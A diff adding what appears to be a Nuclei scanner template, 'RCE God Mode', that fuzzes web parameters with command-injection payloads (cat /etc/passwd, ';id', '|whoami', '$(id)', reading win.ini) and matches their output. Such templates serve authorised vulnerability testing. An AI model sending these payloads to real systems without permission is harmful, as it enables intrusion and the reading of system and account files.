@@ -1,0 +1,33 @@
+id: K70n0s510-rce-godmode
+info:
+  name: RCE God Mode (Universal OS)
+  author: K70n0s510
+  severity: critical
+  description: Fuzzes for standard Linux/Windows command execution.
+  tags: rce,fuzz
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?cmd=cat+/etc/passwd"
+      - "{{BaseURL}}/?cmd=type+c:\windows\win.ini"
+      - "{{BaseURL}}/?ip=127.0.0.1;id"
+      - "{{BaseURL}}/?ping=127.0.0.1|whoami"
+      - "{{BaseURL}}/?q=$(id)"
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        name: linux-passwd
+        regex: ["root:.*:0:0:"]
+      - type: word
+        name: windows-ini
+        words: ["for 16-bit app support", "[fonts]"]
+      - type: regex
+        name: linux-id
+        regex: ["uid=[0-9]+.*gid=[0-9]+"]
+      - type: word
+        name: windows-whoami
+        words: ["nt authority\system"]
+      - type: word
+        name: generic-error
+        words: ["/bin/sh:"]
